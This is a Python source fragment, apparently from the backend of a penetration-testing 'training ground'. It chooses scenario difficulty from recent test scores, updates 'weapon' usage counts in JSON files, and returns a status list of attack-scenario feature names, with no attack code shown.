async def _determine_optimal_difficulty(sandbox_metrics: Dict[str, Any], current_level: int) -> str:
    """Determine optimal difficulty based on sandbox performance metrics."""
    try:
        # Get recent test history
        test_history = sandbox_metrics.get("test_history", [])
        recent_tests = test_history[-10:] if len(test_history) >= 10 else test_history
        
        if not recent_tests:
            # No history, start with basic difficulty
            return "1"
        
        # Calculate success rate
        successful_tests = [test for test in recent_tests if test.get("passed", False)]
        success_rate = len(successful_tests) / len(recent_tests) if recent_tests else 0
        
        # Calculate average score
        scores = [test.get("score", 0) for test in recent_tests]
        avg_score = sum(scores) / len(scores) if scores else 0
        
        # Determine difficulty based on performance
        if success_rate >= 0.8 and avg_score >= 85:
            # High performer - increase difficulty
            return "3"
        elif success_rate >= 0.6 and avg_score >= 70:
            # Moderate performer - medium difficulty
            return "2"
        else:
            # Low performer - basic difficulty
            return "1"
            
    except Exception as e:
        logger.error(f"Error determining optimal difficulty: {str(e)}")
        return "1"  # Default to basic difficulty

async def _analyze_performance_for_difficulty(sandbox_metrics: Dict[str, Any]) -> Dict[str, Any]:
    """Analyze performance metrics to explain difficulty selection."""
    try:
        test_history = sandbox_metrics.get("test_history", [])
        recent_tests = test_history[-10:] if len(test_history) >= 10 else test_history
        
        if not recent_tests:
            return {
                "reason": "No test history available",
                "recommendation": "Starting with basic difficulty"
            }
        
        successful_tests = [test for test in recent_tests if test.get("passed", False)]
        success_rate = len(successful_tests) / len(recent_tests)
        
        scores = [test.get("score", 0) for test in recent_tests]
        avg_score = sum(scores) / len(scores) if scores else 0
        
        return {
            "recent_tests_count": len(recent_tests),
            "success_rate": success_rate,
            "average_score": avg_score,
            "performance_trend": "improving" if success_rate > 0.7 else "stable" if success_rate > 0.5 else "needs_improvement"
        }
        
    except Exception as e:
        logger.error(f"Error analyzing performance: {str(e)}")
        return {"error": str(e)}

async def _update_weapon_usage(weapon_id: str):
    """Update weapon usage count."""
    try:
        import os
        import json
        
        weapons_dir = "weapons_storage"
        weapon_file = os.path.join(weapons_dir, f"{weapon_id}.json")
        
        if os.path.exists(weapon_file):
            with open(weapon_file, 'r') as f:
                weapon_data = json.load(f)
            
            weapon_data['usage_count'] = weapon_data.get('usage_count', 0) + 1
            weapon_data['last_used'] = datetime.utcnow().isoformat()
            
            with open(weapon_file, 'w') as f:
                json.dump(weapon_data, f, indent=2)
                
    except Exception as e:
        logger.error(f"Error updating weapon usage: {str(e)}")

@router.get("/training-ground/status")
async def get_training_ground_status():
    """Get training ground system status."""
    try:
        return {
            "status": "operational",
            "port": 8002,
            "features": [
                "automatic_difficulty_selection",
                "performance_based_scenarios",
                "advanced_penetration_testing",
                "wifi_attack_scenarios",
                "brute_force_scenarios",
                "credential_extraction_scenarios",
                "backdoor_creation_scenarios",
                "live_attack_streaming",
                "weapon_system",
                "weapon_combination",
                "progressive_difficulty_scaling",
                "xp_rewards",
                "real_time_attack_tracking"
            ],
            "timestamp": datetime.utcnow().isoformat()
        }
    except Exception as e:
        logger.error("Error getting training ground status", error=str(e))
        raise HTTPException(status_code=500, detail=str(e)) 